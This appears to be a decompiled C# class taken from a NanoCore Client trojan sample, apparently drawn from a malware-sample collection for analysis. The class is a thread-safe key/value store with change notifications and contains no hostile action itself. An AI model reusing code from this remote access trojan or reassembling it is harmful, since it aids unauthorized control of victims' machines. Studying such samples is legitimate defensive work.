// Decompiled with JetBrains decompiler
// Type: GClass6
// Assembly: NanoCore Client, Version=1.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 3E6578E1-28C0-4BF9-8DBD-C31738BD9814
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Generic-09efb455bb0ce60c3e25c3d2179b7494a69efdee0507cc96a46e1bc838d60041.exe

using NanoCore;
using System.Collections.Generic;
using System.Runtime.CompilerServices;

public sealed class GClass6 : IClientNameObjectCollection
{
  private GDelegate0 gdelegate0_0;
  private Dictionary<string, object> dictionary_0;

  public GClass6(GDelegate0 gdelegate0_1)
  {
    this.gdelegate0_0 = gdelegate0_1;
    this.dictionary_0 = new Dictionary<string, object>();
  }

  public object GetValue(string string_0, object object_0)
  {
    lock (this.dictionary_0)
      return this.dictionary_0.ContainsKey(string_0) ? this.dictionary_0[string_0] : object_0;
  }

  public void SetValue(string string_0, object object_0)
  {
    lock (this.dictionary_0)
    {
      if (this.dictionary_0.ContainsKey(string_0))
      {
        if (this.dictionary_0[string_0].Equals(RuntimeHelpers.GetObjectValue(object_0)))
          return;
        this.dictionary_0[string_0] = RuntimeHelpers.GetObjectValue(object_0);
      }
      else
        this.dictionary_0.Add(string_0, RuntimeHelpers.GetObjectValue(object_0));
    }
    if (this.gdelegate0_0 == null)
      return;
    this.gdelegate0_0(string_0);
  }

  public void RemoveValue(string string_0)
  {
    bool flag;
    lock (this.dictionary_0)
    {
      if (this.dictionary_0.ContainsKey(string_0))
      {
        flag = true;
        this.dictionary_0.Remove(string_0);
      }
    }
    if (!flag || this.gdelegate0_0 == null)
      return;
    this.gdelegate0_0(string_0);
  }

  public bool EntryExists(string string_0)
  {
    lock (this.dictionary_0)
      return this.dictionary_0.ContainsKey(string_0);
  }

  public KeyValuePair<string, object>[] GetEntries()
  {
    lock (this.dictionary_0)
    {
      List<KeyValuePair<string, object>> keyValuePairList = new List<KeyValuePair<string, object>>();
      Dictionary<string, object>.Enumerator enumerator = this.dictionary_0.GetEnumerator();
      while (enumerator.MoveNext())
        keyValuePairList.Add(new KeyValuePair<string, object>(enumerator.Current.Key, RuntimeHelpers.GetObjectValue(enumerator.Current.Value)));
      return keyValuePairList.ToArray();
    }
  }

  public int method_0()
  {
    int count = this.dictionary_0.Count;
    this.dictionary_0.Clear();
    return count;
  }
}
